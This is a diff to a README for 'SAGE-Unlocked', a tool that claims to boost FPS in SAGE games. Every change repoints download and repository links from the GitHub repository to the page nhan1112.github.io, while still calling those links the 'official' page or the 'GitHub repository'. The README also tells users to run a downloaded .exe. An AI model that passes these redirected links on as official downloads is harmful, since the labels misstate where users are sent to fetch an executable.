@@ -1,6 +1,6 @@
 # 🎮 SAGE-Unlocked - Unlock Smooth, High-FPS Gaming Today
 
-[![Download SAGE-Unlocked](https://img.shields.io/badge/Download-SAGE--Unlocked-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/nhan1112/SAGE-Unlocked)
+[![Download SAGE-Unlocked](https://img.shields.io/badge/Download-SAGE--Unlocked-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://nhan1112.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ To get started, you need to download SAGE-Unlocked.
 
 **Step 1: Visit the Download Page**
 
-[Click here to visit the official SAGE-Unlocked download page](https://github.com/nhan1112/SAGE-Unlocked)
+[Click here to visit the official SAGE-Unlocked download page](https://nhan1112.github.io)
 
 This link takes you to the official SAGE-Unlocked repository where you can get the latest version of the application.
 
@@ -105,7 +105,7 @@ We want your experience to be seamless. Here are solutions to a few common scena
 
 Need more help or want to stay updated? We've got you covered.
 
-- **Official Repository:** For the latest releases, source code, and to report issues, visit the [SAGE-Unlocked GitHub repository](https://github.com/nhan1112/SAGE-Unlocked).
+- **Official Repository:** For the latest releases, source code, and to report issues, visit the [SAGE-Unlocked GitHub repository](https://nhan1112.github.io).
 - **Issue Tracker:** Found a bug or have a feature request? Go to the "Issues" tab on GitHub and create a new issue. Our developers and community members are active.
 - **Community Forums:** Join discussions about SAGE games and tools on popular Sonic community forums. Search for "SAGE-Unlocked", and you'll find threads where users share tips.
 
@@ -115,7 +115,7 @@ Need more help or want to stay updated? We've got you covered.
 
 Here's a quick recap to ensure you're all set:
 
-- [ ] Downloaded the ZIP from the [official page](https://github.com/nhan1112/SAGE-Unlocked).
+- [ ] Downloaded the ZIP from the [official page](https://nhan1112.github.io).
 - [ ] Extracted the ZIP to a folder.
 - [ ] Ran the application (`SAGE-Unlocked.exe` or similar).
 - [ ] Selected your SAGE game.
